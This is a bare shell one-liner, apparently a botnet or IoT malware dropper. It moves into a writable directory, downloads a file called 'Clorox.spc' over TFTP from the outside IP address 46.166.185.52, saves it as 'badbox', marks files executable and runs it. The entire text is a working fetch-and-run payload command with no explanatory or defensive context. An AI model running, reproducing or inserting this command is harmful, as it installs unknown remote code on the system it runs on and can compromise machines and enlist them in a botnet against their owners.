cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.52 -c get Clorox.spc;cat Clorox.spc >badbox;chmod +x *;./badbox
